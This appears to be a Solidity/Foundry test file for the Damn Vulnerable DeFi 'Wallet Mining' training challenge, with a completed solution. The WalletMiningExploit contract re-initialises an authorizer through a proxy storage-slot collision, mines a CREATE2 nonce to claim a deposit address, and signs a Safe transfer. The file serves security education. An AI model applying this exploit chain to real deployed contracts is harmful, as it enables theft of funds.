// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // ============================================================
        // Exploit chain:
        // (1) TransparentProxy.upgrader sits at slot 0 — the same slot as
        //     AuthorizerUpgradeable.needsInit. Once setUpgrader() stored a
        //     non-zero address at slot 0, `init()` is callable again
        //     (require(needsInit != 0) reads the upgrader address).
        //     → re-initialize: give the player ward permission on
        //       USER_DEPOSIT_ADDRESS.
        // (2) Mine the Safe proxy nonce that deploys a 1-owner (user) Safe
        //     at USER_DEPOSIT_ADDRESS, then call walletDeployer.drop() —
        //     authorizer now returns true → deploys Safe + pays 1 DVT.
        // (3) Build a Safe tx signed by user (privkey available via
        //     makeAddrAndKey) that transfers the 20M DVT to user. User's
        //     nonce stays 0 because we broadcast from the Safe.
        // (4) Forward the 1 DVT reward to ward.
        // All in 1 player tx via a helper contract.
        new WalletMiningExploit(
            token, authorizer, walletDeployer, proxyFactory, singletonCopy,
            USER_DEPOSIT_ADDRESS, user, userPrivateKey, ward,
            initialWalletDeployerTokenBalance
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

contract WalletMiningExploit {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    constructor(
        DamnValuableToken token,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        SafeProxyFactory proxyFactory,
        Safe singletonCopy,
        address userDepositAddr,
        address user,
        uint256 userPk,
        address ward,
        uint256 reward
    ) {
        // (1) Re-init authorizer: ward=this, aim=userDepositAddr
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = userDepositAddr;
        authorizer.init(wards, aims);

        // (2) Build Safe init data: owners=[user], threshold=1
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (
                owners,        // owners
                1,             // threshold
                address(0),    // to
                "",            // data
                address(0),    // fallbackHandler
                address(0),    // paymentToken
                0,             // payment
                payable(address(0)) // paymentReceiver
            )
        );

        // Mine nonce that deploys at userDepositAddr
        uint256 nonce = _findNonce(proxyFactory, singletonCopy, initializer, userDepositAddr);

        // (3) Deploy via walletDeployer to claim 1 DVT reward
        require(walletDeployer.drop(userDepositAddr, initializer, nonce), "drop failed");

        // (4+5) Recover DVT via user-signed Safe tx, then pay ward
        _recoverAndPay(token, userDepositAddr, user, userPk, ward, reward);
    }

    function _recoverAndPay(
        DamnValuableToken token,
        address userDepositAddr,
        address user,
        uint256 userPk,
        address ward,
        uint256 reward
    ) internal {
        Safe safe = Safe(payable(userDepositAddr));
        uint256 amount = token.balanceOf(userDepositAddr);
        bytes memory txData = abi.encodeWithSignature("transfer(address,uint256)", user, amount);

        bytes32 txHash = safe.getTransactionHash(
            address(token), 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, txHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        safe.execTransaction(
            address(token), 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), sig
        );

        token.transfer(ward, reward);
    }

    function _findNonce(
        SafeProxyFactory factory,
        Safe singleton,
        bytes memory initializer,
        address target
    ) internal view returns (uint256) {
        bytes memory creationCode = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(address(singleton)))
        );
        bytes32 initCodeHash = keccak256(creationCode);
        bytes32 initHash = keccak256(initializer);

        for (uint256 nonce = 0; nonce < 100_000; nonce++) {
            bytes32 salt = keccak256(abi.encodePacked(initHash, nonce));
            address predicted = address(uint160(uint256(
                keccak256(abi.encodePacked(bytes1(0xff), address(factory), salt, initCodeHash))
            )));
            if (predicted == target) return nonce;
        }
        revert("nonce not found");
    }
}
